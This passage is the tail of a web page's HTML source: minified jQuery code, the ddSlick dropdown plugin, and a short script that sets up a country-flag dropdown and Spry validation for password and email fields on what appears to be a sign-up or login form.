b=d?a:f(this).is(":hidden");f(this)[b?"show":"hide"]()}):this.animate(ct("toggle",3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){function g(){e.queue===!1&&f._mark(this);var b=f.extend({},e),c=this.nodeType===1,d=c&&f(this).is(":hidden"),g,h,i,j,k,l,m,n,o,p,q;b.animatedProperties={};for(i in a){g=f.camelCase(i),i!==g&&(a[g]=a[i],delete a[i]);if((k=f.cssHooks[g])&&"expand"in k){l=k.expand(a[g]),delete a[g];for(i in l)i in a||(a[i]=l[i])}}for(g in a){h=a[g],f.isArray(h)?(b.animatedProperties[g]=h[1],h=a[g]=h[0]):b.animatedProperties[g]=b.specialEasing&&b.specialEasing[g]||b.easing||"swing";if(h==="hide"&&d||h==="show"&&!d)return b.complete.call(this);c&&(g==="height"||g==="width")&&(b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],f.css(this,"display")==="inline"&&f.css(this,"float")==="none"&&(!f.support.inlineBlockNeedsLayout||cu(this.nodeName)==="inline"?this.style.display="inline-block":this.style.zoom=1))}b.overflow!=null&&(this.style.overflow="hidden");for(i in a)j=new f.fx(this,b,i),h=a[i],cm.test(h)?(q=f._data(this,"toggle"+i)||(h==="toggle"?d?"show":"hide":0),q?(f._data(this,"toggle"+i,q==="show"?"hide":"show"),j[q]()):j[h]()):(m=cn.exec(h),n=j.cur(),m?(o=parseFloat(m[2]),p=m[3]||(f.cssNumber[i]?"":"px"),p!=="px"&&(f.style(this,i,(o||1)+p),n=(o||1)/j.cur()*n,f.style(this,i,n+p)),m[1]&&(o=(m[1]==="-="?-1:1)*o+n),j.custom(n,o,p)):j.custom(n,h,""));return!0}var e=f.speed(b,c,d);if(f.isEmptyObject(a))return this.each(e.complete,[!1]);a=f.extend({},a);return e.queue===!1?this.each(g):this.queue(e.queue,g)},stop:function(a,c,d){typeof a!="string"&&(d=c,c=a,a=b),c&&a!==!1&&this.queue(a||"fx",[]);return this.each(function(){function h(a,b,c){var e=b[c];f.removeData(a,c,!0),e.stop(d)}var b,c=!1,e=f.timers,g=f._data(this);d||f._unmark(!0,this);if(a==null)for(b in g)g[b]&&g[b].stop&&b.indexOf(".run")===b.length-4&&h(this,g,b);else g[b=a+".run"]&&g[b].stop&&h(this,g,b);for(b=e.length;b--;)e[b].elem===this&&(a==null||e[b].queue===a)&&(d?e[b](!0):e[b].saveState(),c=!0,e.splice(b,1));(!d||!c)&&f.dequeue(this,a)})}}),f.each({slideDown:ct("show",1),slideUp:ct("hide",1),slideToggle:ct("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){f.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),f.extend({speed:function(a,b,c){var d=a&&typeof a=="object"?f.extend({},a):{complete:c||!c&&b||f.isFunction(a)&&a,duration:a,easing:c&&b||b&&!f.isFunction(b)&&b};d.duration=f.fx.off?0:typeof d.duration=="number"?d.duration:d.duration in f.fx.speeds?f.fx.speeds[d.duration]:f.fx.speeds._default;if(d.queue==null||d.queue===!0)d.queue="fx";d.old=d.complete,d.complete=function(a){f.isFunction(d.old)&&d.old.call(this),d.queue?f.dequeue(this,d.queue):a!==!1&&f._unmark(this)};return d},easing:{linear:function(a){return a},swing:function(a){return-Math.cos(a*Math.PI)/2+.5}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),f.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(f.fx.step[this.prop]||f.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=f.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b==="auto"?0:b:a},custom:function(a,c,d){function h(a){return e.step(a)}var e=this,g=f.fx;this.startTime=cq||cr(),this.end=c,this.now=this.start=a,this.pos=this.state=0,this.unit=d||this.unit||(f.cssNumber[this.prop]?"":"px"),h.queue=this.options.queue,h.elem=this.elem,h.saveState=function(){f._data(e.elem,"fxshow"+e.prop)===b&&(e.options.hide?f._data(e.elem,"fxshow"+e.prop,e.start):e.options.show&&f._data(e.elem,"fxshow"+e.prop,e.end))},h()&&f.timers.push(h)&&!co&&(co=setInterval(g.tick,g.interval))},show:function(){var a=f._data(this.elem,"fxshow"+this.prop);this.options.orig[this.prop]=a||f.style(this.elem,this.prop),this.options.show=!0,a!==b?this.custom(this.cur(),a):this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur()),f(this.elem).show()},hide:function(){this.options.orig[this.prop]=f._data(this.elem,"fxshow"+this.prop)||f.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b,c,d,e=cq||cr(),g=!0,h=this.elem,i=this.options;if(a||e>=i.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),i.animatedProperties[this.prop]=!0;for(b in i.animatedProperties)i.animatedProperties[b]!==!0&&(g=!1);if(g){i.overflow!=null&&!f.support.shrinkWrapBlocks&&f.each(["","X","Y"],function(a,b){h.style["overflow"+b]=i.overflow[a]}),i.hide&&f(h).hide();if(i.hide||i.show)for(b in i.animatedProperties)f.style(h,b,i.orig[b]),f.removeData(h,"fxshow"+b,!0),f.removeData(h,"toggle"+b,!0);d=i.complete,d&&(i.complete=!1,d.call(h))}return!1}i.duration==Infinity?this.now=e:(c=e-this.startTime,this.state=c/i.duration,this.pos=f.easing[i.animatedProperties[this.prop]](this.state,c,0,1,i.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update();return!0}},f.extend(f.fx,{tick:function(){var a,b=f.timers,c=0;for(;c<b.length;c++)a=b[c],!a()&&b[c]===a&&b.splice(c--,1);b.length||f.fx.stop()},interval:13,stop:function(){clearInterval(co),co=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){f.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&a.elem.style[a.prop]!=null?a.elem.style[a.prop]=a.now+a.unit:a.elem[a.prop]=a.now}}}),f.each(cp.concat.apply([],cp),function(a,b){b.indexOf("margin")&&(f.fx.step[b]=function(a){f.style(a.elem,b,Math.max(0,a.now)+a.unit)})}),f.expr&&f.expr.filters&&(f.expr.filters.animated=function(a){return f.grep(f.timers,function(b){return a===b.elem}).length});var cv,cw=/^t(?:able|d|h)$/i,cx=/^(?:body|html)$/i;"getBoundingClientRect"in c.documentElement?cv=function(a,b,c,d){try{d=a.getBoundingClientRect()}catch(e){}if(!d||!f.contains(c,a))return d?{top:d.top,left:d.left}:{top:0,left:0};var g=b.body,h=cy(b),i=c.clientTop||g.clientTop||0,j=c.clientLeft||g.clientLeft||0,k=h.pageYOffset||f.support.boxModel&&c.scrollTop||g.scrollTop,l=h.pageXOffset||f.support.boxModel&&c.scrollLeft||g.scrollLeft,m=d.top+k-i,n=d.left+l-j;return{top:m,left:n}}:cv=function(a,b,c){var d,e=a.offsetParent,g=a,h=b.body,i=b.defaultView,j=i?i.getComputedStyle(a,null):a.currentStyle,k=a.offsetTop,l=a.offsetLeft;while((a=a.parentNode)&&a!==h&&a!==c){if(f.support.fixedPosition&&j.position==="fixed")break;d=i?i.getComputedStyle(a,null):a.currentStyle,k-=a.scrollTop,l-=a.scrollLeft,a===e&&(k+=a.offsetTop,l+=a.offsetLeft,f.support.doesNotAddBorder&&(!f.support.doesAddBorderForTableAndCells||!cw.test(a.nodeName))&&(k+=parseFloat(d.borderTopWidth)||0,l+=parseFloat(d.borderLeftWidth)||0),g=e,e=a.offsetParent),f.support.subtractsBorderForOverflowNotVisible&&d.overflow!=="visible"&&(k+=parseFloat(d.borderTopWidth)||0,l+=parseFloat(d.borderLeftWidth)||0),j=d}if(j.position==="relative"||j.position==="static")k+=h.offsetTop,l+=h.offsetLeft;f.support.fixedPosition&&j.position==="fixed"&&(k+=Math.max(c.scrollTop,h.scrollTop),l+=Math.max(c.scrollLeft,h.scrollLeft));return{top:k,left:l}},f.fn.offset=function(a){if(arguments.length)return a===b?this:this.each(function(b){f.offset.setOffset(this,a,b)});var c=this[0],d=c&&c.ownerDocument;if(!d)return null;if(c===d.body)return f.offset.bodyOffset(c);return cv(c,d,d.documentElement)},f.offset={bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;f.support.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(f.css(a,"marginTop"))||0,c+=parseFloat(f.css(a,"marginLeft"))||0);return{top:b,left:c}},setOffset:function(a,b,c){var d=f.css(a,"position");d==="static"&&(a.style.position="relative");var e=f(a),g=e.offset(),h=f.css(a,"top"),i=f.css(a,"left"),j=(d==="absolute"||d==="fixed")&&f.inArray("auto",[h,i])>-1,k={},l={},m,n;j?(l=e.position(),m=l.top,n=l.left):(m=parseFloat(h)||0,n=parseFloat(i)||0),f.isFunction(b)&&(b=b.call(a,c,g)),b.top!=null&&(k.top=b.top-g.top+m),b.left!=null&&(k.left=b.left-g.left+n),"using"in b?b.using.call(a,k):e.css(k)}},f.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),d=cx.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(f.css(a,"marginTop"))||0,c.left-=parseFloat(f.css(a,"marginLeft"))||0,d.top+=parseFloat(f.css(b[0],"borderTopWidth"))||0,d.left+=parseFloat(f.css(b[0],"borderLeftWidth"))||0;return{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&&!cx.test(a.nodeName)&&f.css(a,"position")==="static")a=a.offsetParent;return a})}}),f.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(a,c){var d=/Y/.test(c);f.fn[a]=function(e){return f.access(this,function(a,e,g){var h=cy(a);if(g===b)return h?c in h?h[c]:f.support.boxModel&&h.document.documentElement[e]||h.document.body[e]:a[e];h?h.scrollTo(d?f(h).scrollLeft():g,d?g:f(h).scrollTop()):a[e]=g},a,e,arguments.length,null)}}),f.each({Height:"height",Width:"width"},function(a,c){var d="client"+a,e="scroll"+a,g="offset"+a;f.fn["inner"+a]=function(){var a=this[0];return a?a.style?parseFloat(f.css(a,c,"padding")):this[c]():null},f.fn["outer"+a]=function(a){var b=this[0];return b?b.style?parseFloat(f.css(b,c,a?"margin":"border")):this[c]():null},f.fn[c]=function(a){return f.access(this,function(a,c,h){var i,j,k,l;if(f.isWindow(a)){i=a.document,j=i.documentElement[d];return f.support.boxModel&&j||i.body&&i.body[d]||j}if(a.nodeType===9){i=a.documentElement;if(i[d]>=i[e])return i[d];return Math.max(a.body[e],i[e],a.body[g],i[g])}if(h===b){k=f.css(a,c),l=parseFloat(k);return f.isNumeric(l)?l:k}f(a).css(c,h)},c,a,arguments.length,null)}}),a.jQuery=a.$=f,typeof define=="function"&&define.amd&&define.amd.jQuery&&define("jquery",[],function(){return f})})(window);
			  
			  </script>
			  <script type="text/javascript">
			  
			  (function (a) { function g(a, b) { var c = a.data("ddslick"); var d = a.find(".dd-selected"), e = d.siblings(".dd-selected-value"), f = a.find(".dd-options"), g = d.siblings(".dd-pointer"), h = a.find(".dd-option").eq(b), k = h.closest("li"), l = c.settings, m = c.settings.data[b]; a.find(".dd-option").removeClass("dd-option-selected"); h.addClass("dd-option-selected"); c.selectedIndex = b; c.selectedItem = k; c.selectedData = m; if (l.showSelectedHTML) { d.html((m.imageSrc ? '<img class="dd-selected-image' + (l.imagePosition == "right" ? " dd-image-right" : "") + '" src="' + m.imageSrc + '" />' : "") + (m.text ? '<label class="dd-selected-text">' + m.text + "</label>" : "") + (m.description ? '<small class="dd-selected-description dd-desc' + (l.truncateDescription ? " dd-selected-description-truncated" : "") + '" >' + m.description + "</small>" : "")) } else d.html(m.text); e.val(m.value); c.original.val(m.value); a.data("ddslick", c); i(a); j(a); if (typeof l.onSelected == "function") { l.onSelected.call(this, c) } } function h(b) { var c = b.find(".dd-select"), d = c.siblings(".dd-options"), e = c.find(".dd-pointer"), f = d.is(":visible"); a(".dd-click-off-close").not(d).slideUp(50); a(".dd-pointer").removeClass("dd-pointer-up"); if (f) { d.slideUp("fast"); e.removeClass("dd-pointer-up") } else { d.slideDown("fast"); e.addClass("dd-pointer-up") } k(b) } function i(a) { a.find(".dd-options").slideUp(50); a.find(".dd-pointer").removeClass("dd-pointer-up").removeClass("dd-pointer-up") } function j(a) { var b = a.find(".dd-select").css("height"); var c = a.find(".dd-selected-description"); var d = a.find(".dd-selected-image"); if (c.length <= 0 && d.length > 0) { a.find(".dd-selected-text").css("lineHeight", b) } } function k(b) { b.find(".dd-option").each(function () { var c = a(this); var d = c.css("height"); var e = c.find(".dd-option-description"); var f = b.find(".dd-option-image"); if (e.length <= 0 && f.length > 0) { c.find(".dd-option-text").css("lineHeight", d) } }) } a.fn.ddslick = function (c) { if (b[c]) { return b[c].apply(this, Array.prototype.slice.call(arguments, 1)) } else if (typeof c === "object" || !c) { return b.init.apply(this, arguments) } else { a.error("Method " + c + " does not exists.") } }; var b = {}, c = { data: [], keepJSONItemsOnTop: false, width: 260, height: null, background: "#eee", selectText: "", defaultSelectedIndex: null, truncateDescription: true, imagePosition: "left", showSelectedHTML: true, clickOffToClose: true, onSelected: function () { } }, d = '<div class="dd-select"><input class="dd-selected-value" type="hidden" /><a class="dd-selected"></a><span class="dd-pointer dd-pointer-down"></span></div>', e = '<ul class="dd-options"></ul>', f = '<style id="css-ddslick" type="text/css">' + ".dd-select{ border-radius:2px; border:solid 1px #ccc; position:relative; cursor:pointer;}" + ".dd-desc { color:#aaa; display:block; overflow: hidden; font-weight:normal; line-height: 1.4em; }" + ".dd-selected{ overflow:hidden; display:block; padding:10px; font-weight:bold;}" + ".dd-pointer{ width:0; height:0; position:absolute; right:10px; top:50%; margin-top:-3px;}" + ".dd-pointer-down{ border:solid 5px transparent; border-top:solid 5px #000; }" + ".dd-pointer-up{border:solid 5px transparent !important; border-bottom:solid 5px #000 !important; margin-top:-8px;}" + ".dd-options{ border:solid 1px #ccc; border-top:none; list-style:none; box-shadow:0px 1px 5px #ddd; display:none; position:absolute; z-index:2000; margin:0; padding:0;background:#fff; overflow:auto;}" + ".dd-option{ padding:10px; display:block; border-bottom:solid 1px #ddd; overflow:hidden; text-decoration:none; color:#333; cursor:pointer;-webkit-transition: all 0.25s ease-in-out; -moz-transition: all 0.25s ease-in-out;-o-transition: all 0.25s ease-in-out;-ms-transition: all 0.25s ease-in-out; }" + ".dd-options > li:last-child > .dd-option{ border-bottom:none;}" + ".dd-option:hover{ background:#f3f3f3; color:#000;}" + ".dd-selected-description-truncated { text-overflow: ellipsis; white-space:nowrap; }" + ".dd-option-selected { background:#f6f6f6; }" + ".dd-option-image, .dd-selected-image { vertical-align:middle; float:left; margin-right:5px; max-width:64px;}" + ".dd-image-right { float:right; margin-right:15px; margin-left:5px;}" + ".dd-container{ position:relative;} 0b .dd-selected-text { font-weight:bold} 0b</style>"; if (a("#css-ddslick").length <= 0) { a(f).appendTo("head") } b.init = function (b) { var b = a.extend({}, c, b); return this.each(function () { var c = a(this), f = c.data("ddslick"); if (!f) { var i = [], j = b.data; c.find("option").each(function () { var b = a(this), c = b.data(); i.push({ text: a.trim(b.text()), value: b.val(), selected: b.is(":selected"), description: c.description, imageSrc: c.imagesrc }) }); if (b.keepJSONItemsOnTop) a.merge(b.data, i); else b.data = a.merge(i, b.data); var k = c, l = a('<div id="' + c.attr("id") + '"></div>'); c.replaceWith(l); c = l; c.addClass("dd-container").append(d).append(e); var i = c.find(".dd-select"), m = c.find(".dd-options"); m.css({ width: b.width }); i.css({ width: b.width, background: b.background }); c.css({ width: b.width }); if (b.height != null) m.css({ height: b.height, overflow: "auto" }); a.each(b.data, function (a, c) { if (c.selected) b.defaultSelectedIndex = a; m.append("<li>" + '<a class="dd-option">' + (c.value ? ' <input class="dd-option-value" type="hidden" value="' + c.value + '" />' : "") + (c.imageSrc ? ' <img class="dd-option-image' + (b.imagePosition == "right" ? " dd-image-right" : "") + '" src="' + c.imageSrc + '" />' : "") + (c.text ? ' <label class="dd-option-text">' + c.text + "</label>" : "") + (c.description ? ' <small class="dd-option-description dd-desc">' + c.description + "</small>" : "") + "</a>" + "</li>") }); var n = { settings: b, original: k, selectedIndex: -1, selectedItem: null, selectedData: null }; c.data("ddslick", n); if (b.selectText.length > 0 && b.defaultSelectedIndex == null) { c.find(".dd-selected").html(b.selectText) } else { var o = b.defaultSelectedIndex != null && b.defaultSelectedIndex >= 0 && b.defaultSelectedIndex < b.data.length ? b.defaultSelectedIndex : 0; g(c, o) } c.find(".dd-select").on("click.ddslick", function () { h(c) }); c.find(".dd-option").on("click.ddslick", function () { g(c, a(this).closest("li").index()) }); if (b.clickOffToClose) { m.addClass("dd-click-off-close"); c.on("click.ddslick", function (a) { a.stopPropagation() }); a("body").on("click", function () { a(".dd-click-off-close").slideUp(50).siblings(".dd-select").find(".dd-pointer").removeClass("dd-pointer-up") }) } } }) }; b.select = function (b) { return this.each(function () { if (b.index) g(a(this), b.index) }) }; b.open = function () { return this.each(function () { var b = a(this), c = b.data("ddslick"); if (c) h(b) }) }; b.close = function () { return this.each(function () { var b = a(this), c = b.data("ddslick"); if (c) i(b) }) }; b.destroy = function () { return this.each(function () { var b = a(this), c = b.data("ddslick"); if (c) { var d = c.original; b.removeData("ddslick").unbind(".ddslick").replaceWith(d) } }) } })(jQuery)
			  
			  </script>
			  

			<script type="text/javascript">
			$('.cflagdd').ddslick({  
					onSelected: function(data){  
						if(data.selectedIndex > 0) {
							$('#hidCflag').val(data.selectedData.value);

						   
						}   
					}    
				}); ;

			var sprypassword1 = new Spry.Widget.ValidationPassword("sprypassword1");
			var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1", "email");
			</script>

			</body>
			</html>